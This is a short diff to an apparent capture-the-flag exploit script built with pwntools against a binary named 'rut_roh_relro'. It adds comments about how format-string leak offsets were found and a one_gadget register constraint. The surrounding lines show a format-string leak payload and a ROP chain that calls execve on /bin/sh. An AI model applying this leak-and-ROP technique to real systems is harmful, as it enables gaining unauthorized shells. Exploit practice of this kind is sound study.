@@ -11,6 +11,9 @@ if __name__ == '__main__':
     context.terminal = ['tmux', 'splitw', '-h']
     elf = context.binary = ELF('./rut_roh_relro')
 
+    # Offsets were found by running the program many times and looking at the value that was printed
+    # Stack, libc, and code segment addresses all have unique signatures
+    # There is probably a way to automate
     leaker = b"%62$018p%75$018p%66$018p"
 
     def exec_fmt(payload):
@@ -53,7 +56,7 @@ if __name__ == '__main__':
     rop.execve(binsh, 0, 0)
     chain = rop.chain()
 
-    one_gadget = 0xc9620
+    one_gadget = 0xc9620  # Constraint: rsi == NULL, rdx == NULL
 
     writes = {
         ret_stack_addr: rop.rsi.address,
